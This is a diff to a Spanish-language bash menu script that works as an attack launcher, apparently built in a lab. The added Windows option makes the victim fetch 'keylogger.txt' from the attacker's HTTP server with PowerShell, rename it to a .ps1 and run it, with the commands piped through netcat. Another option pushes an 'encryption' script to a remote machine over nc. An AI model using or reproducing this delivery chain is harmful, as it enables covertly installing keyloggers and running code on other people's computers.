@@ -5,25 +5,14 @@ while true; do
     echo "========================"
     echo "        MENÚ            "
     echo "========================"
-    echo "1. Ejecutar Script 1"
-    echo "2. Ejecutar Script 2"
-    echo "3. Ejecutar Script 3"
-    echo "4. Ejecutar Script Encriptar"
-    echo "5. Salir"
+    echo "1. Ejecutar Script Encriptar"
+    echo "2. Ejecutar Script para Windows"
+    echo "3. Salir"
     echo "========================"
-    read -p "Seleccione una opción [1-5]: " opcion
+    read -p "Seleccione una opción [1-3]: " opcion
 
     case $opcion in
         1)
-            ./script1.sh
-            ;;
-        2)
-            ./script2.sh
-            ;;
-        3)
-            ./script3.sh
-            ;;
-        4)
             # Obtener la dirección IP de la máquina
             var=$(hostname -I | awk '{print $1}')
             
@@ -40,9 +29,33 @@ EOF
             # Esperar a que se inicie el servidor HTTP
             sleep 1
             # Enviar el script remoto a través de nc
-            cat datos.sh | nc -lvp 4500
+            cat datos.sh | nc -lvp 45000 -s $var
             ;;
-        5)
+        2)
+            # Obtener la dirección IP de la máquina
+            var=$(hostname -I | awk '{print $1}')
+            
+            # Crear el script de comandos para Windows
+            cat <<EOF > datos2.sh
+sleep 3        
+dir
+sleep 1
+dir
+sleep 1
+powershell.exe Invoke-WebRequest -Uri "http://$var/exe/keylogger.txt" -OutFile "keylogger.txt"
+sleep 5
+powershell.exe -Command "Rename-Item -Path 'keylogger.txt' -NewName 'keylogger.ps1'"
+sleep 2
+powershell.exe -File "C:\\Users\\Malware-User\\Music\\keylogger.ps1"
+EOF
+ 	    # Ejecutar el servidor HTTP en segundo plano
+            python3 -m http.server 8000 >/dev/null 2>&1 &
+            # Esperar a que se inicie el servidor HTTP
+            sleep 1
+            # Establecer conexión con la máquina Windows y enviar el contenido de datos2.sh
+            cat datos2.sh | nc -lvp 45000 -s $var 2>/dev/null
+            ;;
+        3)
             echo "Saliendo..."
             break
             ;;
